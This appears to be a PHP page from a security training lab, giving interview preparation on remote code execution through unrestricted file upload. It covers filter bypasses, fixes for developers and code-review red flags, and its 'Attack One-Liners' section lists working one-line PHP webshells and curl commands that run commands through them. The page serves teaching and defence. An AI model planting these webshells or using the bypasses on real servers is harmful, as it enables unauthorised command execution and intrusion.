<?php
require_once __DIR__ . '/includes/helpers.php';
$page_title = 'Interview Prep — File Upload Webshell (R2)';
include __DIR__ . '/includes/header.php';
?>

<div class="page">
  <div class="interview-page">

    <div class="interview-hero">
      <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:8px;">
        <span class="badge badge-intermediate">Intermediate</span>
        <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">LAB R2 · INTERVIEW PREP</span>
      </div>
      <h1 style="margin:0 0 6px;">File Upload &rarr; Webshell</h1>
      <p style="color:var(--text-muted);font-size:0.9rem;margin:0;">Remote Code Execution through unrestricted file upload into a web-served directory. Consistently top-10 in bug bounty and pentest findings.</p>
      <div style="margin-top:12px;">
        <a href="/rce_r2.php" class="btn btn-primary btn-sm">Back to Lab</a>
      </div>
    </div>

    <!-- 30-Second Answer -->
    <div class="interview-section">
      <h2>30-Second Answer</h2>
      <div class="thirty-sec">
        File upload RCE happens when three conditions align: the server accepts user-uploaded files, stores them in a web-served directory, and the server executes scripts in that directory (e.g. <code>.php</code> files under Apache+mod_php). An attacker uploads a one-line PHP "webshell" — the server stores it, the attacker visits it via the browser, and the server executes it with the web process's privileges.
      </div>
    </div>

    <!-- Common Qs -->
    <div class="interview-section">
      <h2>Common Interview Questions</h2>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q1">
        <label class="qa-question" for="q1">How do attackers bypass file upload filters?</label>
        <div class="qa-answer">
          <strong>Blacklist bypass:</strong> If the server blocks <code>.php</code>, try alternative PHP extensions that Apache/Nginx may still execute: <code>.php5</code>, <code>.phtml</code>, <code>.phar</code>, <code>.php7</code>, <code>.shtml</code>. Double extensions: <code>shell.php.jpg</code> may still be parsed as PHP depending on Apache config.<br><br>
          <strong>Content-Type spoofing:</strong> Change the <code>Content-Type</code> header to <code>image/jpeg</code> — if the server validates only the MIME header and not the actual content, a PHP file gets through.<br><br>
          <strong>Magic bytes:</strong> Prepend a real JPEG magic header (<code>FF D8 FF</code>) before the PHP payload — passes basic "is this an image?" checks. The PHP interpreter still executes from the first <code>&lt;?php</code> tag.<br><br>
          <strong>Null byte (legacy):</strong> In older PHP, <code>shell.php%00.jpg</code> truncates at the null byte, storing as <code>shell.php</code>.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q2">
        <label class="qa-question" for="q2">How do you prevent file upload RCE?</label>
        <div class="qa-answer">
          <ol style="margin:0;padding-left:1.2em;">
            <li><strong>Store uploads outside the webroot</strong> — files that can't be accessed via HTTP can't be executed by the server, regardless of extension.</li>
            <li><strong>Allowlist extensions</strong> — explicitly permit only known-safe types (<code>jpg</code>, <code>png</code>, <code>pdf</code>). Never blacklist.</li>
            <li><strong>Rename on server side</strong> — replace the original filename with a random UUID. Eliminates extension-based attacks and prevents path traversal.</li>
            <li><strong>Validate file content</strong> — use <code>finfo_file()</code> (libmagic) to verify actual file format, not just MIME headers.</li>
            <li><strong>Serve uploads through a controller script</strong> that sets the correct <code>Content-Type</code> and never executes the file.</li>
            <li><strong>Disable PHP execution in the upload directory</strong> via Apache: <code>php_flag engine off</code> in <code>.htaccess</code>, or via Nginx <code>location</code> block.</li>
          </ol>
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q3">
        <label class="qa-question" for="q3">What is a webshell?</label>
        <div class="qa-answer">
          A webshell is a minimal script that accepts OS commands via HTTP parameters and returns their output — essentially a remote shell interface through the web server. The simplest PHP webshell is a single line: <code>&lt;?php system($_GET['c']); ?&gt;</code>. Once uploaded to a web-served directory, the attacker visits it with a browser or curl, supplying commands as query parameters. Webshells provide persistent access, bypass firewalls (traffic looks like normal HTTP), and can survive reboots since they're stored on disk.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q4">
        <label class="qa-question" for="q4">What is the difference between a stored webshell and a reverse shell?</label>
        <div class="qa-answer">
          A <strong>webshell</strong> is passive — it sits on disk waiting for incoming HTTP requests. The attacker initiates each command over HTTP. No outbound network connection is needed from the victim. A <strong>reverse shell</strong> is active — the victim machine initiates an outbound TCP connection back to the attacker's listener (e.g. via <code>nc</code> or Metasploit). Reverse shells provide an interactive TTY and are useful when inbound ports are firewalled, but they require the victim to have outbound internet access and are noisier on network monitoring. Often, attackers use a webshell to plant a reverse shell.
        </div>
      </div>
    </div>

    <!-- Dev Fix -->
    <div class="interview-section">
      <h2>Developer Fix</h2>
      <div style="display:flex;flex-direction:column;gap:10px;font-size:0.875rem;color:var(--text-muted);">
        <div><strong style="color:var(--text);">Store uploads outside the webroot</strong> — e.g. <code>/var/uploads/</code> instead of <code>/var/www/html/uploads/</code>. Serve files through a PHP controller that reads and streams the content.</div>
        <div><strong style="color:var(--text);">Allowlist safe extensions:</strong> <code>$allowed = ['jpg','jpeg','png','gif','pdf','txt'];</code> — reject everything else.</div>
        <div><strong style="color:var(--text);">Rename the file server-side:</strong> <code>$new_name = bin2hex(random_bytes(16)) . '.' . $ext;</code></div>
        <div><strong style="color:var(--text);">Disable script execution</strong> in the upload directory. Apache <code>.htaccess</code>: <code>php_flag engine off</code>. Nginx: <code>location /uploads { deny all; }</code> for direct access, serve via proxy.</div>
        <div><strong style="color:var(--text);">Validate content with libmagic</strong>: <code>finfo_file(new finfo(FILEINFO_MIME_TYPE), $tmp_path)</code></div>
      </div>
    </div>

    <!-- One-liners -->
    <div class="interview-section">
      <h2>Attack One-Liners</h2>
      <p style="font-size:0.82rem;color:var(--text-muted);margin-bottom:10px;">Minimal PHP webshells to upload:</p>
      <div class="oneliner">&lt;?php system($_GET['c']); ?&gt;</div>
      <div class="oneliner">&lt;?php passthru($_GET['c']); ?&gt;</div>
      <div class="oneliner">&lt;?php echo shell_exec($_GET['c']); ?&gt;</div>
      <p style="font-size:0.82rem;color:var(--text-muted);margin:10px 0 6px;">Access after upload:</p>
      <div class="oneliner">curl "http://target/uploads/shell.php?c=cat+/flags/lab_r2.txt"</div>
      <div class="oneliner">curl "http://target/uploads/shell.php?c=id"</div>
    </div>

    <!-- Red Flags -->
    <div class="interview-section">
      <h2>Red Flags in Code Review</h2>
      <div class="red-flag-item">&#9888; <code>move_uploaded_file($tmp, __DIR__ . '/uploads/' . $name)</code> — original filename used, inside webroot</div>
      <div class="red-flag-item">&#9888; Extension check via blacklist — any list of blocked extensions will be incomplete</div>
      <div class="red-flag-item">&#9888; <code>$_FILES['f']['type']</code> used for validation — this is a user-controlled header, trivially spoofed</div>
      <div class="red-flag-item">&#9888; Upload directory is under <code>public_html</code>, <code>htdocs</code>, or <code>www</code> without execution disabled</div>
      <div class="red-flag-item">&#9888; No server-side filename sanitization — path traversal (<code>../../config.php</code>) risk</div>
    </div>

  </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
